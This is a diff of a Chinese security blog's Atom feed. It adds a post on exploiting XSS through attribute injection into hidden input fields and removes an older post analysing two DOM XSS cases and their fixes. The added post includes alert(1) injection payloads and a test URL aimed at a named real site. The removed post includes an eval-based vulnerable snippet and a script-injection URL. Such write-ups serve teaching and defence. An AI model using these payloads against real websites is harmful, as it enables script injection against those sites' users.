@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-01-19T08:35:57.000Z</updated>
+  <updated>2016-01-20T06:37:13.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,6 +13,39 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[input标签type为hidden时的xss利用]]></title>
+    <link href="http://xdxd.love/2016/01/20/input%E6%A0%87%E7%AD%BEtype%E4%B8%BAhidden%E6%97%B6%E7%9A%84xss%E5%88%A9%E7%94%A8/"/>
+    <id>http://xdxd.love/2016/01/20/input标签type为hidden时的xss利用/</id>
+    <published>2016-01-20T06:05:01.000Z</published>
+    <updated>2016-01-20T06:37:13.000Z</updated>
+    <content type="html"><![CDATA[<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
+<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> name=<span class="string">"redacted"</span> value=<span class="string">"default"</span> injection=<span class="string">"xss"</span> /&gt;
+</code></pre><h1 id="结论">结论</h1><p>在某些条件下是可以执行javascript的，但是比较鸡肋。资料收集的结论就是利用价值极低。</p>
+<h1 id="利用方式">利用方式</h1><p>1，如果输出是在type=”hidden”之前，直接覆盖type，就变成了一个常规的xss。这个情况比较少见。</p>
+<p>2，建立两个HTML文件，one.htm</p>
+<pre><code><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">two.htm</span>&gt;</span>
+</code></pre><p>two.htm</p>
+<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
+</code></pre><p>测试于IE6-9 可以弹。</p>
+<p>3，firefox使用键盘交互的方式。</p>
+<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> accesskey=<span class="string">"X"</span> onclick=<span class="string">"alert(1)"</span>&gt;
+</code></pre><p> Only works on Firefox. ALT+SHIFT+X on Windows/Linux, CTRL+ALT+X osx.</p>
+<h1 id="实例测试">实例测试</h1><pre><code><span class="keyword">http</span>://m.yohobuy.com/passport//back//backcode?phoneNum=15381187741&amp;token=a<span class="number">%20</span>accesskey=X<span class="number">%20</span>onclick=alert<span class="number">%281</span><span class="number">%29</span>&amp;areaCode=8
+</code></pre><p><img src="/images/inputhidden1.png" alt=""></p>
+<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/9856" target="_blank" rel="external">http://zone.wooyun.org/content/9856</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
+<pre><code>&lt;input <span cl]]>
+    </summary>
+    
+      <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
+    
+      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[ffmpeg SSRF漏洞分析]]></title>
@@ -962,74 +995,6 @@ retdata['<span class="literal">result</span>'],retdata['error'] = ret
       <category term="sqlmap" scheme="http://xdxd.love/tags/sqlmap/"/>
     
       <category term="奇技淫巧" scheme="http://xdxd.love/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[几个DOM XSS案例分析]]></title>
-    <link href="http://xdxd.love/2015/11/03/%E5%87%A0%E4%B8%AADOM-XSS%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/"/>
-    <id>http://xdxd.love/2015/11/03/几个DOM-XSS案例分析/</id>
-    <published>2015-11-03T07:03:31.000Z</published>
-    <updated>2015-12-29T09:07:37.000Z</updated>
-    <content type="html"><![CDATA[<p>案例一：</p>
-<p>搜索框输入payload，点击搜索的时候触发。利用起来比较鸡肋，一直对dom xss没有仔细分析过，记录一下dom xss的常规分析方法。</p>
-<p><img src="/images/domxss1.png" alt=""></p>
-<p>在输入框中输入单引号，查看console报错。定位到goPage函数。<br><img src="/images/domxss2.png" alt=""></p>
-<p>定位到相关代码：</p>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">getSearchKeys</span>(<span class="params"></span>) </span>{
-    <span class="keyword">var</span> keys = {};
-    <span class="keyword">if</span> (!<span class="built_in">window</span>.location.search)
-        <span class="keyword">return</span> keys;
-    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="built_in">window</span>.location.search.slice(<span class="number">1</span>).split(<span class="string">"&amp;"</span>), i = <span class="number">0</span>, len = t.length; len &gt; i; i++) {
-        <span class="keyword">var</span> m = t[i].split(<span class="string">"="</span>);
-        keys[m[<span class="number">0</span>]] = m[<span class="number">1</span>]
-    }
-    <span class="keyword">return</span> keys
-}
-<span class="function"><span class="keyword">function</span> <span class="title">goPage</span>(<span class="params">keys</span>) </span>{
-    <span class="built_in">window</span>.location.href = <span class="built_in">window</span>.location.protocol + <span class="string">"//"</span> + <span class="built_in">window</span>.location.host + <span class="built_in">window</span>.location.pathname + <span class="string">"?"</span> + <span class="built_in">eval</span>(<span class="string">"'"</span> + <span class="built_in">JSON</span>.stringify(keys) + <span class="string">"'"</span>).slice(<span class="number">1</span>, -<span class="number">1</span>).replace(<span class="regexp">/\"/g</span>, <span class="string">""</span>).replace(<span class="regexp">/\:/g</span>, <span class="string">"="</span>).replace(<span class="regexp">/\,/g</span>, <span class="string">"&amp;"</span>)
-}
-</code></pre><p>getSearchKeys获取url中的search参数，保存到keys中。在goPage中，keys进入了eval函数。如下：</p>
-<pre><code>eval<span class="list">(<span class="string">"'"</span> + JSON.stringify<span class="list">(<span class="keyword">keys</span>)</span> + <span class="string">"'"</span>)</span>
-</code></pre><p>导致js执行。</p>
-<p><img src="/images/domxss3.png" alt=""></p>
-<p>调试js，异常时断点。可以观察keys的值，以及eval执行的字符串。</p>
-<p>修复代码：去掉了eval函数</p>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">goPage</span>(<span class="params">keys</span>) </span>{
-        <span class="keyword">var</span> sk = combineKeys(keys);
-        <span class="built_in">window</span>.location.href = <span class="built_in">window</span>.location.protocol + <span class="string">"//"</span> + <span class="built_in">window</span>.location.host + <span class="built_in">window</span>.location.pathname + <span class="string">"?"</span> + sk
-    }
-    <span class="function"><span class="keyword">function</span> <span class="title">combineKeys</span>(<span class="params">keys</span>) </span>{
-        <span class="keyword">var</span> currSearch = <span class="built_in">window</span>.location.search;
-        <span class="keyword">if</span> (currSearch) {
-            currSearch = currSearch.slice(<span class="number">1</span>) + <span class="string">"&amp;"</span>;
-            <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> keys)
-                <span class="keyword">if</span> (currSearch.indexOf(key + <span class="string">"="</span>) &gt;= <span class="number">0</span>) {
-                    <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(key + <span class="string">"=(.|\n)*?&amp;"</span>);
-                    currSearch = currSearch.replace(reg, key + <span class="string">"="</span> + keys[key] + <span class="string">"&amp;"</span>)
-                } <span class="keyword">else</span>
-                    currSearch = currSearch + key + <span class="string">"="</span> + keys[key] + <span class="string">"&amp;"</span>;
-            currSearch = currSearch.slice(<span class="number">0</span>, -<span class="number">1</span>)
-        } <span class="keyword">else</span>
-            <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> keys)
-                currSearch = currSearch + key + <span class="string">"="</span> + keys[key];
-        <span class="keyword">return</span> currSearch
-    }
-</code></pre><p>案例二：</p>
-<p><a href="https://url?fileName=111jpg&amp;cameraName=%3C/span%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/span%3E" target="_blank" rel="external">https://url?fileName=111jpg&amp;cameraName=%3C/span%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/span%3E</a>  触发。</p>
-<p>形式看起来像反射xss，但是搜索源码没有发现alert关键词。在script标签中，输入alert(1);111111这样执行到这里的时候会触发异常，使用chrome的调试工具的异常断点。</p>
-<p><img src="/images/dom2.jpg" alt=""></p>
-<p>之后使用F10 step over next function call 按钮。定位到<br><img src="/images/dom3.jpg" alt=""></p>
-<p>看到是因为$(‘#cameraName’).html(cameraName); 直接html()获取到的内容导致的dom型xss。</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>案例一：</p>
-<p>搜索框输入payload，点击搜索的时候触发。利用起来比较鸡肋，一直对dom xss没有仔细分析过，记录一下dom xss的常规分析方法。</p>
-<p><img src="/images/domxss1.png" alt=""></p>
-<p>在输]]>
-    </summary>
-    
-      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
